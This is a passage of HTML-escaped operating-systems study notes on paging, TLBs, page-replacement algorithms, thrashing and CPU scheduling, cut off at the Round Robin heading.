        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Hardware reloads TLB with pages from a page tables&lt;/li&gt;
&lt;li&gt;Typically hardware page tables are Radix Trees&lt;/li&gt;
&lt;li&gt;Requires complex hardware&lt;/li&gt;
&lt;li&gt;Examples: x86, ARM64, IBM POWER9+&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;intel-x86-paging&#34; &gt;Intel x86 Paging
&lt;span&gt;
    &lt;a href=&#34;#intel-x86-paging&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Control registers are priviledged&lt;/li&gt;
&lt;li&gt;bits in a control register (%cr0)&lt;/li&gt;
&lt;li&gt;4KB pages&lt;/li&gt;
&lt;li&gt;%c43 points to 4KB page directory&lt;/li&gt;
&lt;li&gt;1024 page directory entries
&lt;ul&gt;
&lt;li&gt;physical address of a page table&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;page table has 1024 entries
&lt;ul&gt;
&lt;li&gt;virtual 4K page per entry&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tlb&#34; &gt;TLB
&lt;span&gt;
    &lt;a href=&#34;#tlb&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;x86 CPUs started using translation lookaside buffer (TLB) in caches to speedup page table lookup to avoid 3 memory references per load/store (page directory, page table, physical page access).&lt;/li&gt;
&lt;li&gt;requires flushing on context switch to avoid returning invalid page&lt;/li&gt;
&lt;li&gt;now each entry has a process ID to avoid flushing&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;os&#34; &gt;OS
&lt;span&gt;
    &lt;a href=&#34;#os&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;OS lives in same address space of process&lt;/li&gt;
&lt;li&gt;Permission bits&lt;/li&gt;
&lt;li&gt;Map kernel in boot loader&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;software-managed-mmu&#34; &gt;Software Managed MMU
&lt;span&gt;
    &lt;a href=&#34;#software-managed-mmu&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Simpler hardware and asks software to reload pages&lt;/li&gt;
&lt;li&gt;Requires fast exception handling and optimized software&lt;/li&gt;
&lt;li&gt;Enables more flexibility in the TLB (e.g. variable page sizes)&lt;/li&gt;
&lt;li&gt;TLB fields: Virtual page, Pid, Page frame, NC (no cache), D[irty], V(alid), Global (ignore PID)&lt;/li&gt;
&lt;li&gt;64 64-bit entries&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;TLB Instructions&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;twlbwr: write a random slot&lt;/li&gt;
&lt;li&gt;tlbwi: write a specific slot&lt;/li&gt;
&lt;li&gt;tlbr: read a specific slot&lt;/li&gt;
&lt;li&gt;tlbp: probe a slot containing an address&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Registers needed to be  loaded&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;c0_entryhi: high bits of TLB entry&lt;/li&gt;
&lt;li&gt;c0_entrylo: low bits of TLB entry&lt;/li&gt;
&lt;li&gt;c0_index: TLB Index&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;tlb-exceptions&#34; &gt;TLB Exceptions
&lt;span&gt;
    &lt;a href=&#34;#tlb-exceptions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;UTLB Miss: Generated when the accessing useg without matching TLB entry&lt;/li&gt;
&lt;li&gt;TLB Miss: Generated when the accessing kseg2 without matching entry&lt;/li&gt;
&lt;li&gt;TLB Mod: Generated when writing to read-only page&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;virtual-memory-os&#34; &gt;Virtual Memory OS
&lt;span&gt;
    &lt;a href=&#34;#virtual-memory-os&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;increasing-virtual-memory-by-paging&#34; &gt;Increasing Virtual Memory by Paging
&lt;span&gt;
    &lt;a href=&#34;#increasing-virtual-memory-by-paging&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;The number of pages for a memory system is the size of the memory divided by the size of each page.&lt;/p&gt;
&lt;p&gt;To translate a virtual address to a physical address, we replace the starting bits of the virtual address that corresponds to the
virtual page number, and replace it with the frame number.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use disk to simulate larger virtual than physical mem&lt;/li&gt;
&lt;li&gt;Disk is much slower than memory so find 20% hot to put into memory and 80% cold into disk&lt;/li&gt;
&lt;li&gt;How to resume after a page fault&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Restarting Instructions&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Faulting virtual address (In %c0_vaddr reg on MIPS)&lt;/li&gt;
&lt;li&gt;Address of instruction that caused fault (%c0_epc reg)&lt;/li&gt;
&lt;li&gt;Read or write, fetch, user access or kernel access?&lt;/li&gt;
&lt;li&gt;Hardware must allow resuming after a fault&lt;/li&gt;
&lt;li&gt;Idempotent instructions are easy
&lt;ul&gt;
&lt;li&gt;A simple load or store instruction can be re-executed&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Superpages&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Large mappings&lt;/li&gt;
&lt;li&gt;2/4 MB mappings&lt;/li&gt;
&lt;li&gt;Sometimes more pages in L2 cache than TLB entries&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;fifo-eviction&#34; &gt;FIFO Eviction
&lt;span&gt;
    &lt;a href=&#34;#fifo-eviction&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Evict oldest fetched page in system&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;lru-page-replacement&#34; &gt;LRU Page replacement
&lt;span&gt;
    &lt;a href=&#34;#lru-page-replacement&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Worse for looping over memory (better to use MRU eviction then)&lt;/li&gt;
&lt;li&gt;Stamping timer is too expensive as it doubles memory traffic&lt;/li&gt;
&lt;li&gt;Keeping a doubly-linked list is annoying&lt;/li&gt;
&lt;li&gt;Better to approximate&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;clock-algorithm&#34; &gt;Clock Algorithm
&lt;span&gt;
    &lt;a href=&#34;#clock-algorithm&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Do FIFO but skip accessed pages&lt;/li&gt;
&lt;li&gt;Keep pages in circular FIFO list&lt;/li&gt;
&lt;li&gt;Scan all and find a page that isn&amp;rsquo;t set and Evict
&lt;ul&gt;
&lt;li&gt;If A = 1, set A = 0. If A = 0, evict&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Runs when there is very low memory&lt;/li&gt;
&lt;li&gt;When there is larger memory, use two clock hands at a fixed size. The first hands clears and the second hand picks evicted pages&lt;/li&gt;
&lt;li&gt;Can take advantage of hardware dirty bit to prefer clean pages over dirty page. A dirty page has to be written to the disk&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Or use n-bit accessed count instead of just A bit. On sweep, count = (A &amp;laquo; (n - 1) | (count &amp;raquo; 1)). Evict the page with the lowest count.&lt;/p&gt;
&lt;p&gt;Random eviction avoids belady and double swaps by hypervisors, and is simple to implement.&lt;/p&gt;
&lt;p&gt;Databases are workload specific.&lt;/p&gt;
&lt;h4 id=&#34;other-page-replacement-algorithms&#34; &gt;Other Page Replacement Algorithms
&lt;span&gt;
    &lt;a href=&#34;#other-page-replacement-algorithms&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Random eviction
&lt;ul&gt;
&lt;li&gt;Used in hypervisors to avoid double swap&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LFU&lt;/li&gt;
&lt;li&gt;MFU&lt;/li&gt;
&lt;li&gt;Specific policies&lt;/li&gt;
&lt;li&gt;Naïve paging: 2 disk I/Os per fault&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;page-buffering&#34; &gt;Page Buffering
&lt;span&gt;
    &lt;a href=&#34;#page-buffering&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Keep pool of free page frames. On fault, evict victim page, and read into free page so that execution can continue while writing out evicted page which is then added to the page pool.&lt;/p&gt;
&lt;h3 id=&#34;page-allocation&#34; &gt;Page Allocation
&lt;span&gt;
    &lt;a href=&#34;#page-allocation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;thrashing&#34; &gt;Thrashing
&lt;span&gt;
    &lt;a href=&#34;#thrashing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Threashing is when an application is in a constantly swapping pages in and out preventing the application from making forward progress at any reasonable rate.&lt;/p&gt;
&lt;p&gt;Process uses more memory than system has&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;working set
&lt;ul&gt;
&lt;li&gt;How much cache/memory for process is required&lt;/li&gt;
&lt;li&gt;Only run processes that meet requirements&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;page fault frequency
&lt;ul&gt;
&lt;li&gt;PFF = page faults / instructions executed&lt;/li&gt;
&lt;li&gt;PFF &amp;gt; threshold = more memory? Swap out if no more memory&lt;/li&gt;
&lt;li&gt;PFF &amp;lt; threshdold = take away memory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;scheduling&#34; &gt;Scheduling
&lt;span&gt;
    &lt;a href=&#34;#scheduling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;cpu-scheduling&#34; &gt;CPU Scheduling
&lt;span&gt;
    &lt;a href=&#34;#cpu-scheduling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Transition States&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;new &amp;ndash; admit → ready &amp;ndash; scheduler dispatch → running &amp;ndash; exit &amp;ndash; I/O or event wait → waiting&lt;/li&gt;
&lt;li&gt;running &amp;ndash; exit → Terminated&lt;/li&gt;
&lt;li&gt;waiting &amp;ndash; I/O or event completion → ready&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;scheduling-decisions&#34; &gt;Scheduling Decisions
&lt;span&gt;
    &lt;a href=&#34;#scheduling-decisions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;Switches from running to waiting state&lt;/li&gt;
&lt;li&gt;Switches from running to ready state&lt;/li&gt;
&lt;li&gt;Switches from new/waiting to ready&lt;/li&gt;
&lt;li&gt;Exits&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Non-preemptive schedules use 1 &amp;amp; 4 only&lt;/li&gt;
&lt;li&gt;Preemptive schedulers run at all four points&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;first-come-first-served&#34; &gt;First Come First Served
&lt;span&gt;
    &lt;a href=&#34;#first-come-first-served&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;If P1 = 24, P2 = 3, P3 = 3,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Throughput&lt;/strong&gt; = jobs / total time = 3 / 30 = 0.1 jobs / sec.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Turnaround time&lt;/strong&gt; = sum of end times / jobs  = (24 + 27 + 30) / 3 = 27&lt;/li&gt;
&lt;li&gt;long periods where no I/O is issued and CPU held&lt;/li&gt;
&lt;li&gt;poor I/O device utilization&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;bursts-of-computation-and-io&#34; &gt;Bursts of Computation and I/O
&lt;span&gt;
    &lt;a href=&#34;#bursts-of-computation-and-io&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Jobs are both compute and I/O waiting. Therefore overlap I/O and compute from multiple jobs.&lt;/p&gt;
&lt;h3 id=&#34;shortest-job-first&#34; &gt;Shortest Job First
&lt;span&gt;
    &lt;a href=&#34;#shortest-job-first&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Schedule the job whose next CPU burst is the shortest&lt;/li&gt;
&lt;li&gt;Attempts to minimize turnaround time
&lt;ul&gt;
&lt;li&gt;Ends up &lt;strong&gt;minimizing waiting time&lt;/strong&gt; and &lt;strong&gt;response time&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;With preemption, it is called shortest-remaining-time-first
&lt;ul&gt;
&lt;li&gt;preemption means if a new job that has shorter CPU burst length, replace the job&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Requires estimating burst time because future cannot be predicted
&lt;ul&gt;
&lt;li&gt;Exponentially weighted average&lt;/li&gt;
&lt;li&gt;T&lt;sub&gt;n+1&lt;/sub&gt; = alpha * t&lt;sub&gt;n&lt;/sub&gt; + (1 - alpha) * T&lt;sub&gt;n&lt;/sub&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Can lead to unfairness and starvation&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;round-robin&#34; &gt;Round Robin
&lt;span&gt;
    &lt;a href=&#34;#round-robin&#34;&gt;
